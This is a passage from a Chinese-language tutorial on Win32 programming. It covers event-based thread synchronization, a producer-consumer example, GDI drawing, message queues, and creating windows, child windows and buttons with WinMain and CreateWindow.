class="params">(HANDLE hEvent)</span></span>;       <span class="comment">//将对象设置为已通知</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、关闭时间对象句柄</span><br><span class="line">       <span class="comment">//关闭句柄</span></span><br><span class="line">CloseHandle();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、线程控制实验：只读形式的线程控制</span><br><span class="line"></span><br><span class="line">HANDLE g_hEvent;</span><br><span class="line"></span><br><span class="line">HWND hEdit1;</span><br><span class="line">HWND hEdit2;</span><br><span class="line">HWND hEdit3;</span><br><span class="line">HWND hEdit4;</span><br><span class="line">HANDLE hThread1;</span><br><span class="line">HANDLE hThread2;</span><br><span class="line">HANDLE hThread3;</span><br><span class="line">HANDLE hThread4;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc1</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//创建事件</span></span><br><span class="line"><span class="comment">//默认安全属性  手动设置未通知状态(TRUE)  初始状态未通知 没有名字 </span></span><br><span class="line">g_hEvent = CreateEvent(<span class="literal">NULL</span>, TRUE, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">HANDLE　hThread[<span class="number">3</span>];</span><br><span class="line"><span class="comment">//创建3个线程</span></span><br><span class="line">hThread[<span class="number">0</span>] = ::CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc2, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread[<span class="number">1</span>] = ::CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc3, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread[<span class="number">2</span>] = ::CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc4, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置文本框的值</span></span><br><span class="line">SetWindowText(hEdit1,<span class="string">"1000"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置事件为已通知</span></span><br><span class="line">SetEvent(g_hEvent);</span><br><span class="line"></span><br><span class="line"><span class="comment">//等待线程结束 销毁内核对象</span></span><br><span class="line">WaitForMultipleObjects(<span class="number">3</span>, hThread, TRUE, INFINITE);  </span><br><span class="line">CloseHandle(hThread[<span class="number">0</span>]);  </span><br><span class="line">CloseHandle(hThread[<span class="number">1</span>]);</span><br><span class="line">CloseHandle(hThread[<span class="number">2</span>]);</span><br><span class="line">CloseHandle(g_hEvent);  </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc2</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR szBuffer[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当事件变成已通知时 </span></span><br><span class="line">WaitForSingleObject(g_hEvent, INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//读取内容</span></span><br><span class="line">GetWindowText(hEdit1,szBuffer,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">SetWindowText(hEdit2,szBuffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc3</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR szBuffer[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当事件变成已通知时 </span></span><br><span class="line">WaitForSingleObject(g_hEvent, INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//读取内容</span></span><br><span class="line">GetWindowText(hEdit1,szBuffer,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">SetWindowText(hEdit3,szBuffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc4</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR szBuffer[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当事件变成已通知时 </span></span><br><span class="line">WaitForSingleObject(g_hEvent, INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//读取内容</span></span><br><span class="line">GetWindowText(hEdit1,szBuffer,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">SetWindowText(hEdit4,szBuffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>另外通知类型还能实现线程同步。  </p><p>注意：互斥里面没有有序的概念，可能某个线程多次执行，而另一个一直不执行<br>而互斥加有序，就是同步   </p><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/1.png?x-oss-process=style/yangruiqi.com" alt="1"></p><p>下面举个示例，生产者和消费者问题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//事件和临界区</span></span><br><span class="line">HANDLE g_hSet, g_hClear;</span><br><span class="line"><span class="keyword">int</span> g_Max = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> g_Number = <span class="number">0</span>;</span><br><span class="line">                   </span><br><span class="line"><span class="comment">//生产者线程函数  </span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProduct</span><span class="params">(LPVOID pM)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; g_Max; i++)</span><br><span class="line">    &#123;  </span><br><span class="line">        WaitForSingleObject(g_hSet, INFINITE);  </span><br><span class="line">g_Number = <span class="number">1</span>; </span><br><span class="line">DWORD id = GetCurrentThreadId();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"生产者%d将数据%d放入缓冲区\n"</span>,id, g_Number); </span><br><span class="line">        SetEvent(g_hClear);   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//消费者线程函数</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadConsumer</span><span class="params">(LPVOID pM)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; g_Max; i++)</span><br><span class="line">    &#123;  </span><br><span class="line">        WaitForSingleObject(g_hClear, INFINITE);  </span><br><span class="line">g_Number = <span class="number">0</span>; </span><br><span class="line">DWORD id = GetCurrentThreadId();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"----消费者%d将数据%d放入缓冲区\n"</span>,id, g_Number); </span><br><span class="line">        SetEvent(g_hSet);   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    HANDLE hThread[<span class="number">2</span>]; </span><br><span class="line"></span><br><span class="line">g_hSet = CreateEvent(<span class="literal">NULL</span>, FALSE, TRUE, <span class="literal">NULL</span>);  </span><br><span class="line">    g_hClear = CreateEvent(<span class="literal">NULL</span>, FALSE, FALSE, <span class="literal">NULL</span>); </span><br><span class="line"></span><br><span class="line">    hThread[<span class="number">0</span>] = ::CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProduct, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>); </span><br><span class="line">hThread[<span class="number">1</span>] = ::CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadConsumer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    WaitForMultipleObjects(<span class="number">2</span>, hThread, TRUE, INFINITE);  </span><br><span class="line">    CloseHandle(hThread[<span class="number">0</span>]);  </span><br><span class="line">    CloseHandle(hThread[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//销毁 </span></span><br><span class="line">CloseHandle(g_hSet);  </span><br><span class="line">    CloseHandle(g_hClear);  </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>事件和互斥体区别： 事件有通知类型，可以同时给很多个线程发消息。互斥体没办法线程同步，事件可以。   </p><h1 id="窗口"><a href="#窗口" class="headerlink" title="窗口"></a>窗口</h1><p>本质是画出来的。通过API</p><h2 id="窗口的本质-GUI（User32，画图，windows现成的界面）GDI（gdi32-绘图，自己画的）"><a href="#窗口的本质-GUI（User32，画图，windows现成的界面）GDI（gdi32-绘图，自己画的）" class="headerlink" title="窗口的本质 GUI（User32，画图，windows现成的界面）GDI（gdi32 绘图，自己画的）"></a>窗口的本质 GUI（User32，画图，windows现成的界面）GDI（gdi32 绘图，自己画的）</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/2.png?x-oss-process=style/yangruiqi.com" alt="2"></p><p>Handle是私有句柄表的索引，HWND是全局句柄表的索引。  </p><h2 id="GDI-图形设备接口（Graphics-Device-Interface）"><a href="#GDI-图形设备接口（Graphics-Device-Interface）" class="headerlink" title="GDI 图形设备接口（Graphics Device Interface）"></a>GDI 图形设备接口（Graphics Device Interface）</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/3.png?x-oss-process=style/yangruiqi.com" alt="3"></p><p>先得到窗口句柄(设备对象)，<br>HWND </p><p>再得到设备上下文，<br>HDC hdc=GetDC(hwnd)</p><p>创建画笔<br>hpen=Create(当前笔的分割，宽度，颜色)</p><p>关联笔和对象<br>selectObject(hdc,hpen)</p><p>移动初始笔的位置<br>MoveToEx(hdc,0,400,原来坐标)</p><p>然后开始画比如<br>LineTO（hdc，x坐标，y坐标）</p><p>释放资源<br>DeleteObjct(hpen),ReleaseDc(hwnd,hdc)</p><h1 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h1><p>什么是消息：<br>操作系统吧动作记录下来，存储到一个结构体中，这个结构体就是一个消息。   </p><h2 id="消息队列：每个线程只有一个消息队列"><a href="#消息队列：每个线程只有一个消息队列" class="headerlink" title="消息队列：每个线程只有一个消息队列"></a>消息队列：每个线程只有一个消息队列</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/4.png?x-oss-process=style/yangruiqi.com" alt="4"></p><p>消息产生时，操作系统先接受，遍历所有窗口对象，找到之后，发送到该窗口对象进程的线程，然后线程把他放到消息队列里。<br>一个线程可以多个窗口，一个窗口只属于一个线程   </p><h1 id="第一个Windows程序"><a href="#第一个Windows程序" class="headerlink" title="第一个Windows程序"></a>第一个Windows程序</h1><table><thead><tr><th>句柄</th><th>所属</th></tr></thead><tbody><tr><td>HWND</td><td>窗口句柄</td></tr><tr><td>HANDLE</td><td>内核对象句柄</td></tr><tr><td>HDC</td><td>设备句柄</td></tr><tr><td>HINSTANCE</td><td>模块句柄</td></tr></tbody></table><p>真正对象在0环，这个只是个索引，一个DWORD</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(<span class="comment">//窗口回调</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HWND hwnd, </span></span></span><br><span class="line"><span class="function"><span class="params">  UINT uMsg, </span></span></span><br><span class="line"><span class="function"><span class="params">  WPARAM wParam, </span></span></span><br><span class="line"><span class="function"><span class="params">  LPARAM lParam </span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> DefWindowProc(hStatusWnd, uMsg, wParam, lParam)<span class="comment">//调用下默认处理函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> CALLBACK WinMain(</span><br><span class="line">  _In_  HINSTANCE hInstance,<span class="comment">//指向一个模块的句柄，当前模块在内存中的位置</span></span><br><span class="line">  _In_  HINSTANCE hPrevInstance,<span class="comment">//永远空</span></span><br><span class="line">  _In_  LPSTR lpCmdLine,<span class="comment">//对应CreateProcess的命令行参数</span></span><br><span class="line">  _In_  <span class="keyword">int</span> nCmdShow<span class="comment">//对应CreateProcess的创建属性</span></span><br><span class="line">)&#123;</span><br><span class="line">    TCHAR className[]=TEXT(<span class="string">"chuangkouming"</span>);</span><br><span class="line">    <span class="comment">//1.第一步，定义你的窗口怎么样的</span></span><br><span class="line">    WINCLASS wndClass=&#123;<span class="number">0</span>&#125;;<span class="comment">//初始化窗口类</span></span><br><span class="line">    wndClass.hrBackgound=(HBRUSH)COLOR_BACKGROUND;<span class="comment">//设置背景颜色，画刷类型</span></span><br><span class="line">    wndClass.lpszClassName=className;<span class="comment">//设置窗口名</span></span><br><span class="line">    wndClass.hInstance=hInstance;<span class="comment">//当前窗口属于哪个程序</span></span><br><span class="line">    wndClass.lpfnWndProc=WindowProc;<span class="comment">//设置窗口回调函数</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//2.注册窗口类</span></span><br><span class="line">    RegisterClass(&amp;wndClass)</span><br><span class="line">    <span class="comment">//3.创建窗口类</span></span><br><span class="line">  <span class="function">HWND <span class="title">CreateWindow</span><span class="params">( </span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpClassName, <span class="comment">//窗口类名</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCTSTR lpWindowName, <span class="comment">//窗口名</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD dwStyle, <span class="comment">//窗口样式</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> x, </span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> y, </span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> nWidth, </span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> nHeight, </span></span></span><br><span class="line"><span class="function"><span class="params">  HWND hWndParent, <span class="comment">//父窗口句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HMENU hMenu, <span class="comment">//菜单句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HANDLE hInstance, <span class="comment">//属于哪个模块</span></span></span></span><br><span class="line"><span class="function"><span class="params">  PVOID lpParam <span class="comment">//参数</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line">ShowWindow(hwnd,SW_SHOW)</span><br><span class="line"><span class="comment">//3.接受消息并处理</span></span><br><span class="line">MSG msg;</span><br><span class="line"><span class="function">BOOL <span class="title">GetMessage</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPMSG lpMsg, <span class="comment">//消息放在这</span></span></span></span><br><span class="line"><span class="function"><span class="params">  HWND hWnd, <span class="comment">//null所有消息</span></span></span></span><br><span class="line"><span class="function"><span class="params">  UINT wMsgFilterMin, <span class="comment">//过滤条件。0是全要</span></span></span></span><br><span class="line"><span class="function"><span class="params">  UINT wMsgFilterMax </span></span></span><br><span class="line"><span class="function"><span class="params">      )</span></span>;</span><br><span class="line">BOOL bRet;</span><br><span class="line"><span class="comment">//例子</span></span><br><span class="line"><span class="keyword">while</span>( (bRet = GetMessage( &amp;msg, hWnd, <span class="number">0</span>, <span class="number">0</span> )) != <span class="number">0</span>)</span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">if</span> (bRet == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// handle the error and possibly exit</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//转换消息，把键盘虚拟码转成字符</span></span><br><span class="line">        TranslateMessage(&amp;msg); </span><br><span class="line">    <span class="comment">//分发消息，</span></span><br><span class="line">        DispatchMessage(&amp;msg); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>char szOutBuff[0x80]</p><p>窗口不能用printf,必须用OutputDebugString(szOutBuff),但是这不能打印变量，所以先得用sprint(szOutbuff,”%d”,GetLastError())格式化字符串</p><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/7.png" alt="5"></p><h1 id="消息类型"><a href="#消息类型" class="headerlink" title="消息类型"></a>消息类型</h1><p>typedef struct tagMSG {<br>  HWND hwnd; //属于哪个窗口句柄<br>  UINT message;//消息的类型<br>  WPARAM wParam; //<br>  LPARAM lParam; //<br>  DWORD time; //消息什么时候产生的<br>  POINT pt; //消息在什么类型产生的<br>} MSG;</p><h1 id="子窗口"><a href="#子窗口" class="headerlink" title="子窗口"></a>子窗口</h1><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/8.png" alt="8"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HWND CreateWindow( </span><br><span class="line">  &quot;Edit&quot;, //窗口类名</span><br><span class="line">  &quot;&quot;, //窗口名</span><br><span class="line">  WS_CHILD|//窗口样式,子窗口必带</span><br><span class="line">  WS_VISIBLE|WS_VSCROLL</span><br><span class="line">, </span><br><span class="line">  int x, </span><br><span class="line">  int y, </span><br><span class="line">  int nWidth, </span><br><span class="line">  int nHeight, </span><br><span class="line">  HWND hWndParent, //父窗口句柄</span><br><span class="line">  HMENU hMenu, //父窗口的话菜单句柄，子窗口的话是标识</span><br><span class="line">  HANDLE hInstance, //属于哪个模块，一般用个全局变量，在父窗口那赋值</span><br><span class="line">  PVOID lpParam //参数</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>子窗口通过WM_COMMAND向父窗口发消息，在父窗口回调里可以处理WM_COMMAND，如果要区分是哪个子窗口，可以通过回调函数的参数确定<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WPARAM wParam; //</span><br><span class="line">  LPARAM lParam; //</span><br></pre></td></tr></table></figure></p><p>一个是编号（HMENU hMenu，也就是wParam的低16位LOWORD），一个是句柄，<br>如果想设置文本框内容可以<br>SetDlgText（hwnd，编号，字符串）<br>得到就是GetDlgText</p><p>按钮就是一个子窗口，<br>按钮的WNDCLASS不是我们定义的，是系统预定义好的。如果我们想知道，系统预定义的WNDCLASS都包含什么样的信息                                </p><p>怎么做？                                </p><p>TCHAR szBuffer[0x20];<br>GetClassName(hwndPushButton,szBuffer,0x20);                                </p><p>WNDCLASS wc;<br>GetClassInfo(hAppInstance,szBuffer,&amp;wc);<br>OutputDebugStringF(“–&gt;%s\n”,wc.lpszClassName);<br>OutputDebugStringF(“–&gt;%x\n”,wc.lpfnWndProc);                                </p><p>总结：                                </p><p>1、按钮是一种特殊的窗体，并不需要提供单独的窗口回调函数.                                </p><p>2、当按钮有事件产生时，会给父窗口消息处理程序发送一个WM_COMMAND消息                                </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">按钮--&gt;系统提供WinProc</span><br><span class="line">系统提供WinProc--&gt;父窗口的WinProc</span><br></pre></td></tr></table></figure><p>系统提供WinProc将消息转换成WM_COMMAND，发给父窗口</p><p>下面是视频PPT的代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">步骤<span class="number">1</span>：创建Windows应用程序  选择空项目</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">步骤<span class="number">2</span>：在新建项窗口中选C++代码文件 创建一个新的cpp文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">步骤<span class="number">3</span>：在新的cpp文件中添加:<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">并添加入口函数：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> CALLBACK <span class="title">WinMain</span><span class="params">(  CALLBACK 是一个宏 </span></span></span><br><span class="line"><span class="function"><span class="params">_In_  HINSTANCE hInstance,  #define CALLBACK    __stdcall</span></span></span><br><span class="line"><span class="function"><span class="params">_In_  HINSTANCE hPrevInstance,  </span></span></span><br><span class="line"><span class="function"><span class="params">_In_  LPSTR lpCmdLine,  </span></span></span><br><span class="line"><span class="function"><span class="params">_In_  <span class="keyword">int</span> nCmdShow  </span></span></span><br><span class="line">)  所有的Win32     API函数都遵循该约定</span><br><span class="line">&#123;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">步骤<span class="number">4</span>：设计窗口类</span><br><span class="line"></span><br><span class="line">代码：</span><br><span class="line"></span><br><span class="line"><span class="comment">//窗口的类名</span></span><br><span class="line">TCHAR className[] = <span class="string">"My First Window"</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建窗口类的对象 </span></span><br><span class="line">WNDCLASS wndclass = &#123;<span class="number">0</span>&#125;;<span class="comment">//一定要先将所有值赋值</span></span><br><span class="line">wndclass.hbrBackground = (HBRUSH)COLOR_MENU;<span class="comment">//窗口的背景色</span></span><br><span class="line">wndclass.lpfnWndProc = WindowProc;<span class="comment">//窗口过程函数</span></span><br><span class="line">wndclass.lpszClassName = className;<span class="comment">//窗口类的名字</span></span><br><span class="line">wndclass.hInstance = hInstance;<span class="comment">//定义窗口类的应用程序的实例句柄</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">步骤<span class="number">5</span>：注册窗口类</span><br><span class="line"></span><br><span class="line">RegisterClass(&amp;wndclass);  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">步骤<span class="number">6</span>：创建窗口</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建窗口  </span></span><br><span class="line">HWND hwnd = CreateWindow(  </span><br><span class="line">className,<span class="comment">//类名</span></span><br><span class="line">TEXT(<span class="string">"我的第一个窗口"</span>),<span class="comment">//窗口标题</span></span><br><span class="line">WS_OVERLAPPEDWINDOW,<span class="comment">//窗口外观样式 </span></span><br><span class="line"><span class="number">10</span>,<span class="comment">//相对于父窗口的X坐标</span></span><br><span class="line"><span class="number">10</span>,<span class="comment">//相对于父窗口的Y坐标</span></span><br><span class="line"><span class="number">600</span>,<span class="comment">//窗口的宽度  </span></span><br><span class="line"><span class="number">300</span>,<span class="comment">//窗口的高度  </span></span><br><span class="line"><span 